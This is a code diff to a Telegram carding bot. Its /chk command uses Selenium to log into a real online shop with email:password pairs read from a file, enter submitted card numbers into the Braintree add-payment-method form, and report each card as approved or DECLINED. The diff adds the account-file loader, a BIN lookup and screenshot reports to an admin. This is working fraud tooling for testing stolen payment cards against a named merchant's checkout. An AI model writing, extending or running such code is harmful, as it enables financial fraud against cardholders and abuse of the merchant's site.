@@ -6787,7 +6787,25 @@ async def bt_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         msg = await update.message.reply_text(f"💳 `{card_str}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
         Process(target=run_bt_check, args=(card_str, update.effective_chat.id, msg.message_id), daemon=True).start()
 
-# ==== 10. /chk Command (FINAL - SS FIXED 100%) ==== #
+# ==== 10. /chk Command (FINAL - FILE + SS FIXED) ==== #
+
+def get_chk_accounts():
+    accounts = []
+    try:
+        with open("chk_accounts.txt", "r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if ":" in line:
+                    email, password = line.split(":", 1)
+                elif "|" in line:
+                    email, password = line.split("|", 1)
+                else:
+                    continue
+                accounts.append((email.strip(), password.strip()))
+    except Exception as e:
+        print("Failed to read chk_accounts.txt:", e)
+    return accounts
+
 
 def run_chk_process(card_input):
     import random, time, traceback
@@ -6811,7 +6829,7 @@ def run_chk_process(card_input):
         url = "https://shop.pottyplant.com.au/my-account/add-payment-method/"
         driver.get(url)
 
-        # LOGIN
+        # ===== LOGIN =====
         wait.until(EC.presence_of_element_located((By.ID, "username"))).send_keys(email)
         wait.until(EC.presence_of_element_located((By.ID, "password"))).send_keys(password)
 
@@ -6822,15 +6840,16 @@ def run_chk_process(card_input):
 
         time.sleep(2)
 
-        # FORCE REDIRECT
+        # 🔥 FORCE REDIRECT AFTER LOGIN
         driver.get(url)
         wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))
 
+        # ===== WAIT FOR SUBMIT BUTTON =====
         add_btn = wait.until(EC.presence_of_element_located((By.ID, "place_order")))
 
         cc, mm, yy, cvv = killer_split_card(card_input)
 
-        # BRAINTREE FILL
+        # ===== BRAINTREE FILL =====
         iframes = driver.find_elements(By.CSS_SELECTOR, "iframe")
 
         for iframe in iframes:
@@ -6851,12 +6870,12 @@ def run_chk_process(card_input):
             except:
                 driver.switch_to.default_content()
 
-        # SUBMIT
+        # ===== SUBMIT =====
         driver.execute_script("arguments[0].click();", add_btn)
 
         time.sleep(2)
 
-        # RESPONSE
+        # ===== RESPONSE =====
         try:
             err = driver.find_element(By.CSS_SELECTOR, ".woocommerce-error li").text
             status = "DECLINED"
@@ -6883,12 +6902,15 @@ def run_chk_process(card_input):
         }
 
     except Exception:
-        # ❗ DO NOT QUIT DRIVER HERE
+        # ❗ DO NOT CLOSE DRIVER HERE
         return {
             "error": traceback.format_exc(),
             "driver": driver
         }
-    
+
+
+# ================= TELEGRAM CMD =================
+
 async def chk_cmd(update, context):
     uid = update.effective_user.id
 
@@ -6911,6 +6933,14 @@ async def chk_cmd(update, context):
             parse_mode="Markdown"
         )
         return
+
+    # BIN prefetch
+    try:
+        b6 = re.sub(r"[^0-9]", "", card_input)[:6]
+        if b6:
+            asyncio.create_task(_prefetch_bin_async(b6))
+    except:
+        pass
 
     msg = await update.message.reply_text("⚙️ Processing Braintree Auth...")
 
@@ -6940,13 +6970,13 @@ async def chk_cmd(update, context):
 
         await msg.edit_text("❌ Request timeout, try again.")
 
-        # 🔥 SEND SCREENSHOT BEFORE QUIT
+        # 📸 SEND SCREENSHOT TO ADMIN
         try:
             killer_admin_report("chk", trace, driver)
         except:
             pass
 
-        # 🔥 NOW SAFE TO CLOSE DRIVER
+        # 🔥 NOW CLOSE DRIVER AFTER SS
         try:
             if driver:
                 driver.quit()
@@ -6954,7 +6984,6 @@ async def chk_cmd(update, context):
             pass
 
         record_cmd_failure("chk")
-
 
 # ==== 12. /sort COMMAND (Fixed Card Sorting & Cleaning) ====
 def extract_and_clean_cards_sort(data_text):
